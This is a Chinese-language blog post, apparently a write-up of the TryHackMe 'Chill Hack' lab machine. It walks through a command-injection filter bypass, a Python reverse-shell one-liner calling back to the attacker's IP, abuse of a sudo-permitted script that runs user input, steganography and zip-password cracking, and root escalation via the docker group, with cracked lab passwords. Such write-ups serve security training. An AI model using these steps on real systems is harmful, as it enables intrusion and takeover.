@@ -1,0 +1,397 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Chill Hack | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Chill Hack端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.128.89 22 SSH 10.48.128.89:22  OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 0   2 10.48.128.89 21 FTP 10.48.128.89:21  Vsftpd 3.0.5 0   3 10.48.128">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Chill Hack">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Chill_Hack.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="Chill Hack端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.128.89 22 SSH 10.48.128.89:22  OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 0   2 10.48.128.89 21 FTP 10.48.128.89:21  Vsftpd 3.0.5 0   3 10.48.128">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-17T05:56:08.000Z">
+<meta property="article:modified_time" content="2026-05-17T10:41:44.150Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="docker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Chill_Hack.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Chill Hack',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-17 18:41:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Chill Hack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-17T05:56:08.000Z" title="发表于 2026-05-17 13:56:08">2026-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-17T10:41:44.150Z" title="更新于 2026-05-17 18:41:44">2026-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Chill-Hack"><a href="#Chill-Hack" class="headerlink" title="Chill Hack"></a>Chill Hack</h1><p>端口扫描</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="center">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">10.48.128.89</td>
+<td align="center">22</td>
+<td align="left">SSH</td>
+<td align="left">10.48.128.89:22</td>
+<td align="left"></td>
+<td align="left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">10.48.128.89</td>
+<td align="center">21</td>
+<td align="left">FTP</td>
+<td align="left">10.48.128.89:21</td>
+<td align="left"></td>
+<td align="left">Vsftpd 3.0.5</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="left">10.48.128.89</td>
+<td align="center">80</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.48.128.89/">http://10.48.128.89:80</a></td>
+<td align="left">Game Info</td>
+<td align="left">Apache-HTTP-Server&#x2F;2.4.41, Apache-Web-Server, jQuery-official-website-CDN, Apache&#x2F;2.4.41 (Ubuntu)</td>
+<td align="center">200</td>
+</tr>
+</tbody></table>
+<p>目录扫描得到 <code>/secret</code>，是一个可以命令执行的地方</p>
+<p>可以执行 <code>id</code> 命令</p>
+<p><img src="/../image/TryHackMe/easy/Chill_Hack/secret.png"></p>
+<p>执行 <code>ls</code> 被拦截，使用绝对路径 <code>/bin/ls</code> 成功，看来是黑名单拦截</p>
+<p>查看用户</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;bin&#x2F;ls -al &#x2F;home
+total 24
+drwxr-xr-x  6 root    root    4096 May 17 06:46 .
+drwxr-xr-x 24 root    root    4096 May 17 06:46 ..
+drwxr-x---  2 anurodh anurodh 4096 Oct  4  2020 anurodh
+drwxr-xr-x  5 apaar   apaar   4096 Oct  4  2020 apaar
+drwxr-x---  4 aurick  aurick  4096 Oct  3  2020 aurick
+drwxr-xr-x  3 ubuntu  ubuntu  4096 May 17 06:46 ubuntu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接反弹 <code>shell</code></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;bin&#x2F;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket();s.connect((&quot;192.168.206.169&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>kali</code> 监听，成功反弹</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 12523
+bash: cannot set terminal process group (833): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-48-128-89:&#x2F;var&#x2F;www&#x2F;html&#x2F;secret$ id
+id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 <code>/home/apaar</code> 目录下找到一个 <code>www-data</code> 可以执行的文件 <code>.helpline.sh</code></p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@ip-10-48-128-89:&#x2F;home&#x2F;apaar$ ls -al
+ls -al
+total 44
+...
+-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
+-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由于<code> $msg</code> 被直接执行，因此可以传入任意系统命令</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@ip-10-48-128-89:&#x2F;home&#x2F;apaar$ cat .helpline.sh
+#!&#x2F;bin&#x2F;bash
+echo
+echo &quot;Welcome to helpdesk. Feel free to talk to anyone at any time!&quot;
+echo
+read -p &quot;Enter the person whom you want to talk with: &quot; person
+read -p &quot;Hello user! I am $person,  Please enter your message: &quot; msg
+$msg 2&gt;&#x2F;dev&#x2F;null
+echo &quot;Thank you for your precious time!&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用 <code>echo -e &quot;aaa\nsudo -l&quot; | ./.helpline.sh</code> 来执行 <code>sudo -l</code> 命令</p>
+<p><code>www-data</code> 可以无密码以 <code>apaar </code>用户身份执行 <code>/home/apaar/.helpline.sh</code></p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@ip-10-48-128-89:&#x2F;home&#x2F;apaar$ echo -e &quot;aaa\nsudo -l&quot; | .&#x2F;.helpline.sh
+
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+Matching Defaults entries for www-data on ip-10-48-128-89:
+    env_reset, mail_badpass,
+    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
+User www-data may run the following commands on ip-10-48-128-89:
+    (apaar : ALL) NOPASSWD: &#x2F;home&#x2F;apaar&#x2F;.helpline.sh
+Thank you for your precious time!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先使用 <code>script</code> 创建一个伪终端，然后以 <code>apaar </code>身份执行文件，成功切换用户，并在 <code>local.txt</code> 里面得到 <code>flag</code></p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@ip-10-48-128-89:&#x2F;home&#x2F;apaar$ script &#x2F;dev&#x2F;null
+script &#x2F;dev&#x2F;null
+Script started, file is &#x2F;dev&#x2F;null
+$ sudo -u apaar .&#x2F;.helpline.sh
+sudo -u apaar &#x2F;home&#x2F;apaar&#x2F;.helpline.sh
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+Enter the person whom you want to talk with: aaa
+aaa
+Hello user! I am test,  Please enter your message: &#x2F;bin&#x2F;bash
+&#x2F;bin&#x2F;bash
+id
+uid&#x3D;1001(apaar) gid&#x3D;1001(apaar) groups&#x3D;1001(apaar)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对 <code>apaar </code>尝试各种方法提权都不行，看 <code>wp</code> 关键点还是在 <code>www-data </code>这里，进入到 <code>/var/www/files</code> 目录</p>
+<p>有一个 <code>hacker.php</code>，有一个提示，大概意思是在黑暗中会找到答案，而刚好上面有一张图片</p>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;var&#x2F;www&#x2F;files
+
+ls -al
+total 28
+drwxr-xr-x 3 root root 4096 Oct  3  2020 .
+drwxr-xr-x 4 root root 4096 Oct  3  2020 ..
+-rw-r--r-- 1 root root  391 Oct  3  2020 account.php
+-rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
+drwxr-xr-x 2 root root 4096 Oct  3  2020 images
+-rw-r--r-- 1 root root 1153 Oct  3  2020 index.php
+-rw-r--r-- 1 root root  545 Oct  3  2020 style.css
+
+
+cat hacker.php
+&lt;html&gt;
+&lt;head&gt;
+&lt;body&gt;
+&lt;center&gt;
+        &lt;img src &#x3D; &quot;images&#x2F;hacker-with-laptop_23-2147985341.jpg&quot;&gt;&lt;br&gt;
+        &lt;h1 style&#x3D;&quot;background-color:red;&quot;&gt;You have reached this far. &lt;&#x2F;h2&gt;
+        &lt;h1 style&#x3D;&quot;background-color:black;&quot;&gt;Look in the dark! You will find your answer&lt;&#x2F;h1&gt;
+&lt;&#x2F;center&gt;
+&lt;&#x2F;head&gt;
+&lt;&#x2F;html&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>wget</code> 下载到本地，使用 <code>steghide</code> 得到隐写的 <code>zip</code>，但是解压需要密码</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# wget &#39;http:&#x2F;&#x2F;10.48.128.89:8000&#x2F;images&#x2F;hacker-with-laptop_23-2147985341.jpg&#39;
+               
+┌──(root㉿kali)-[~&#x2F;桌面]
+└─# steghide --extract -sf hacker-with-laptop_23-2147985341.jpg 
+Enter passphrase: 
+wrote extracted data to &quot;backup.zip&quot;.
+                                                                                                                                   
+┌──(root㉿kali)-[~&#x2F;桌面]
+└─# unzip backup.zip 
+Archive:  backup.zip
+[backup.zip] source_code.php password: 
+   skipping: source_code.php         incorrect password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用 <code>john</code> 破解得到密码</p>
+<blockquote>
+<p>pass1word</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# zip2john backup.zip &gt; zip_hash.txt
+ver 2.0 efh 5455 efh 7875 backup.zip&#x2F;source_code.php PKZIP Encr: TS_chk, cmplen&#x3D;554, decmplen&#x3D;1211, crc&#x3D;69DC82F3 ts&#x3D;2297 cs&#x3D;2297 type&#x3D;8
+                        
+┌──(root㉿kali)-[~&#x2F;桌面]
+└─# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt zip_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32&#x2F;64])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+pass1word        (backup.zip&#x2F;source_code.php)     
+1g 0:00:00:00 DONE (2026-05-17 15:30) 50.00g&#x2F;s 819200p&#x2F;s 819200c&#x2F;s 819200C&#x2F;s total90..cocoliso
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>解压后在里面的 <code>php</code> 文件里面又得到一个密码，解码结果为</p>
+<blockquote>
+<p>!d0ntKn0wmYp@ssw0rd </p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span>
+└─<span class="token comment"># unzip backup.zip</span>
+Archive<span class="token punctuation">:</span>  backup<span class="token operator">.</span>zip
+<span class="token punctuation">[</span>backup<span class="token operator">.</span>zip<span class="token punctuation">]</span> source_code<span class="token operator">.</span>php password<span class="token punctuation">:</span> 
+  inflating<span class="token punctuation">:</span> source_code<span class="token operator">.</span>php         
+
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span>
+└─<span class="token comment"># cat source_code.php | grep "pass"</span>
+                        Password<span class="token punctuation">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"password"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"password"</span> placeholder<span class="token operator">=</span><span class="token string double-quoted-string">"password"</span><span class="token operator">></span>
+                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"IWQwbnRLbjB3bVlwQHNzdzByZA=="</span><span class="token punctuation">)</span>
+  
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span>
+└─<span class="token comment"># echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d</span>
+<span class="token operator">!</span>d0ntKn0wmYp@ssw0rd   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>猜测是 <code>ssh</code> 的密码，前面得到了四个用户，一个一个尝试，最后以 <code>anurodh</code> 用户身份登录</p>
+<p>并且执行 <code>id</code> 后发现该用户在 <code>docker</code> 组里面</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# ssh anurodh@10.48.128.89
+anurodh@10.48.128.89&#39;s password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU&#x2F;Linux 5.15.0-138-generic x86_64)
+
+anurodh@ip-10-48-128-89:~$ id
+uid&#x3D;1002(anurodh) gid&#x3D;1002(anurodh) groups&#x3D;1002(anurodh),999(docker)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那就直接 <code>docker</code> 提权</p>
+<pre class="line-numbers language-none"><code class="language-none">anurodh@ip-10-48-128-89:~$ docker images
+REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
+alpine        latest    a24bb4013296   5 years ago   5.57MB
+hello-world   latest    bf756fb1ae65   6 years ago   13.3kB
+anurodh@ip-10-48-128-89:~$ docker run -it -v &#x2F;:&#x2F;host alpine &#x2F;bin&#x2F;sh
+&#x2F; # id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Chill_Hack.html">https://x9wd09ncc.github.io/post/TryHackMe_Chill_Hack.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/docker/">docker</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Year_of_the_Rabbit.html" title="TryHackMe_Year of the Rabbit"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Year of the Rabbit</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Brute_It.html" title="TryHackMe_Brute It"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Brute It</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent T</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_tomghost</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break Out The Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break Out The Cage</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div 